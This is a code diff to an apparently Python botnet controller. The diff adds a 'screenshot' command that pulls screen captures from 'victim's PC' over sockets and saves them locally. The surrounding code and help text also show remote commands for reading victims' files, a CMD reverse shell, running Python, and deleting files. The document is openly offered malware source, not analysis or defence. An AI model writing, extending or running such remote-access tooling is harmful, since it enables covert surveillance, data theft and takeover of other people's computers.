@@ -1,6 +1,6 @@
 import socket, platform, os
-#CONSTANTS ADDED
-answerable_cmdlets = ["cat", "selftest", "ls"]
+#SCREENSHOTTER
+answerable_cmdlets = ["cat", "selftest", "ls", "screenshot"]
 onearg_cmdlets = ["cat", "shell", "talk", "execpy", "mkdir", "rmdir", "rm", "ls"]
 doublearg_cmdlets = ["file", "message"]
 #-------------------------------------------------------------------
@@ -53,7 +53,13 @@ def attack_a_bot(botnet_exemplars_ipv4, commandlet):
         if commandlet in onearg_cmdlets:
             firstarg = input(cmds["require_option"])
             sock.send(firstarg.encode("utf-8"))
-        if commandlet in answerable_cmdlets:
+        if commandlet == "screenshot":
+            print("Receiving...")
+            ldata = int(sock.recv(16384).decode("utf-8"))
+            print(f"{ldata} received")
+            data = sock.recv(ldata)
+            open("cap.png", "wb").write(data)
+        elif commandlet in answerable_cmdlets: 
             ans = sock.recv(16384).decode("utf-8")
             print(cmds["Answer_from_bot"]+ans)
         sock.close()
@@ -107,6 +113,7 @@ if platform.system() == "Linux":
 if platform.system() == "Windows":
     help_message = '''
 Commands avaliable:
+[screenshot] = Sends you a screenshot from victim's PC
 [cat] = Read a victim's file
 [shell] = CMD Reverse shell
 [cdjoke] = Tryes to open CDRom
@@ -126,6 +133,7 @@ Commands avaliable:
 if platform.system() == "Linux":
     help_message = '''
 \u001b[31mCommands avaliable\u001b[39m:
+\u001b[34m[\u001b[32mscreenshot\u001b[34m]\u001b[39m = Sends you a screenshot from victim's PC
 \u001b[34m[\u001b[32mcat\u001b[34m]\u001b[39m = Read a victim's file
 \u001b[34m[\u001b[31mshell\u001b[34m]\u001b[39m = CMD Reverse shell
 \u001b[34m[\u001b[31mcdjoke\u001b[34m]\u001b[39m = Tryes to open CDRom
